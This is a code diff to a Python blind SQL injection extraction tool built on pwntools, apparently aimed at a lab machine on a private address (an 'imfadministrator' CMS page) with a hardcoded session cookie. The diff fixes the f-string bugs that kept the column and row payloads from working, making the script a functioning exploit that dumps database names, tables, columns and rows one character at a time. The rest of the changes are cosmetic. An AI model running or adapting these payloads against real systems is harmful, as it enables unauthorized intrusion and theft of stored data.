@@ -15,7 +15,7 @@ from pwn import *
 
 # Ctrl + c
 def ctrlC(sig, frame):
-    print(f"\n\n[{Color.RED}x{Color.END}] {Color.RED}Saliendo...{Color.END}\n")
+    print(f"\n\n[{Color.RED}x{Color.END}] {Color.BOLD}Saliendo...{Color.END}\n")
     sys.exit(1)
 
 
@@ -303,10 +303,10 @@ class Extractor:
         elif exploit == "Tables" and db is not None:
             result = f"' and (select ascii(substring(group_concat(table_name),{position},1)) from information_schema.tables where table_schema='{db.name}')='{character}"
         elif exploit == "Columns" and db is not None and table is not None:
-            result = "' and (select ascii(substring(group_concat(column_name),{position},1)) from information_schema.columns where table_schema='{db.name}' and table_name='{table.name}')='{character}"
+            result = f"' and (select ascii(substring(group_concat(column_name),{position},1)) from information_schema.columns where table_schema='{db.name}' and table_name='{table.name}')='{character}"
         elif exploit == "Rows" and db is not None and table is not None:
             columns = table.concat_columns()
-            result = "' and (select ascii(substring(group_concat({columns}),{position},1)) from {db.name}.{table.name})='{character}"
+            result = f"' and (select ascii(substring(group_concat({columns}),{position},1)) from {db.name}.{table.name})='{character}"
 
         return result
 
@@ -456,7 +456,7 @@ class Extractor:
             for table in db.tables:
 
                 label_info = log.progress(
-                    f"{Color.BOLD}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Table{Color.END}:{Color.CYAN}{table.name}{Color.END} {Color.YELLOW}Rows{Color.END}"
+                    f"{Color.YELLOW}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Table{Color.END}:{Color.CYAN}{table.name}{Color.END} {Color.YELLOW}Rows{Color.END}"
                 )
 
                 info = self._get_info(label_info, label_menu, "Rows", db, table)
@@ -489,21 +489,22 @@ class Extractor:
 
 
 def main():
-    """
+
     # Initiate parameters specifying them
-    main_url = "http://"
+    main_url = "http://192.168.130.132/imfadministrator/cms.php?pagename="
     method = "GET"
-    headers = {}
-    condition = ""
-    num_threads = 1
-    data = ""
+    headers = {"Cookie": "PHPSESSID=guk1as3f6a2o4a27gr97ppfmv3"}
+    condition = "Welcome to the IMF Administration"
+    num_threads = 3
+    data = "home"
     atribute_to_exploit = ""
 
-    instance = Extractor(main_url,method,headers,condition,data,atribute_to_exploit,num_threads)
-    """
+    instance = Extractor(
+        main_url, method, headers, condition, data, atribute_to_exploit, num_threads
+    )
 
     # Initiate parameters with interface
-    instance = Extractor.init_with_interface()
+    # instance = Extractor.init_with_interface()
 
     label_menu = log.progress(Color.RED + "Brute Force" + Color.END)
     label_menu.status(" Starting ...")
